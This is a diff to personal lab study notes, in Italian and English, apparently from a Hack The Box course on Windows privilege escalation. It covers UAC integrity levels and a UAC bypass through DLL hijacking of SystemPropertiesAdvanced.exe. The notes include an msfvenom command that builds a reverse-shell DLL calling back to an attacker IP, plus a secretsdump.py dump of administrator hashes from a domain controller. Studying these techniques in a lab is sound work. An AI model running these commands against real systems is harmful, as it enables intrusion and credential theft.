@@ -618,8 +618,11 @@ Ora abbiamo controllo totale sul domain controller e possiamo prendere tutte le 
 `j4k1dibe@htb[/htb]$ secretsdump.py server_adm@10.129.43.9 -just-dc-user administrator`
 
 # UAC User Access Control
+Le applicazioni hanno diversi integrity levels. e un programma con alti integrity level puo' fare azioni che possono compromettere il sistema.
 
 UAC e' una feature che abilita un prompt di consenso per attivita' che richiedono certi privilegi.
+
+When a standard user attempts to run an app that requires an administrator access token, UAC requires that the user provides valid administrator credentials.
 
 Quando UAC e' abilitato le applicazioni e le task runnano sempre come non amministratore a meno che un amministratore permetta esplicitamente alle applicazioni di eseguire con permessi da administrator.
 
@@ -627,3 +630,39 @@ E' una feature conveniente che previene cambiamenti non voluti daglia admin ma *
 
 UAC puo' dare piu' access rights al Token di un  applicazione
 
+The default RID 500 administrator account always operates at the high mandatory level. With Admin Approval Mode (AAM) enabled, any new admin accounts we create will operate at the medium mandatory level by default and be assigned two separate access tokens upon logging in. In the example below, the user account sarah is in the administrators group, but cmd.exe is currently running in the context of their unprivileged access token.
+
+### Confirming UAC is Encabled
+`C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA`
+
+### Checking UAC Level
+`C:\htb> REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin`
+
+## Bypassing UAC
+
+Bypassare UAC dipende molto dalla versione di windows installata.
+
+`PS C:\htb> [environment]::OSVersion.Version` con questo comando vediamo la Build del nostro Windows.
+
+da questa pagina possiamo vedere a quale release appartiene: https://en.wikipedia.org/wiki/Windows_10_version_history
+
+**UACME** (https://github.com/hfiref0x/UACME) mantiene una lista di UAC BYpass in base alle varie Build di Windows e se windows ha fatto security updates.
+
+Molto spesso sfruttano eseguibili che windows permette di autoelevarsi come ad esempio SystemPropertiesAdvanced.exe. (che cerca una Dll che non esiste e possiamo fare Dll Hijacking).
+
+Quando windows carica una Dll fa questo ordine:
+
+1) The directory from which the application loaded.
+2) The system directory C:\Windows\System32 for 64-bit systems.
+3) The 16-bit system directory C:\Windows\System (not supported on 64-bit systems)
+4) The Windows directory.
+5) Any directories that are listed in the PATH environment variable.
+
+### Printa la PATH env var
+`PS C:\htb> cmd /c echo %PATH%`
+
+### Generiamo una Dll che carichera' quell'exe li'
+`j4k1dibe@htb[/htb]$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.3 LPORT=8443 -f dll > srrstr.dll`
+
+### Eseguiamo SystemPropertiesAdvanced
+`C:\htb> C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe`
